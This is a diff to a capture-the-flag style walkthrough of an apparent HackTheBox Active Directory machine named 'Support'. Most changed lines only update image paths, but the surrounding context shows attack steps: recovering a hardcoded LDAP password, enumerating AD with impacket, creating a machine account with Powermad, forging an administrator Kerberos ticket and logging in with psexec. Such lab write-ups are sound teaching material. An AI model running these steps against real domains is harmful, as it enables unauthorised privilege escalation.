@@ -7,7 +7,7 @@ Running nmap on the machine, we got
 nmap -sC -sV -oA nmap/support 10.10.11.17
 ```
 
-![alt text](image-1.png)
+![alt text](Snapshots/Support-image-1.png)
 
 Added it to our hosts file
 
@@ -34,7 +34,7 @@ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linu
 ```
 
 Open the file UserInfo.exe.config and analyze it in ILSpy. Navigate to UserInfo.Services > Protected
-![alt text](image-9.png)
+![alt text](Snapshots/Support-image-9.png)
 
 
 This is how they encrypt the password using the key "armando"
@@ -91,7 +91,7 @@ ldapsearch didn't work on mine so I used impacket-GetADUser instead
 ```bash
 impacket-GetADUsers -all support.htb/ldap -dc-ip support.htb0
 ```
-![alt text](image-10.png)
+![alt text](Snapshots/Support-image-10.png)
 
 Instead of ldapsearch or impacket, use Apache Directory Studio so we can have a better view of the AD
 
@@ -109,7 +109,7 @@ Connect to the AD using ldap user creds:
 - Bind DN: ldap@support.htb
 - Password: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
 
-![alt text](image.png)
+![alt text](Snapshots/Support-image.png)
 
 Got the following creds of support user
 
@@ -227,7 +227,7 @@ Now in the victim's machine:
 Import-Module .\Powermad.ps1
 ```
 
-![alt text](image-2.png)
+![alt text](Snapshots/Support-image-2.png)
 
 Now we see that we can create new computers since our machineaccountquota is 10.
 
@@ -271,7 +271,7 @@ Get the value of rc4_hmac and generate Kerberos ticket for the administrator:
 
 Grab the last ticket (Base64) for the Administrator and save it as ticket.kirbi.b64 in our attacker's machine.
 
-![alt text](image-3.png)
+![alt text](Snapshots/Support-image-3.png)
 
 Now decode the file:
 
@@ -291,4 +291,4 @@ Using the ticket.cache, we login to the machine as Admin via impacket's psexec:
 KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 ```
 
-![alt text](image-4.png)
+![alt text](Snapshots/Support-image-4.png)
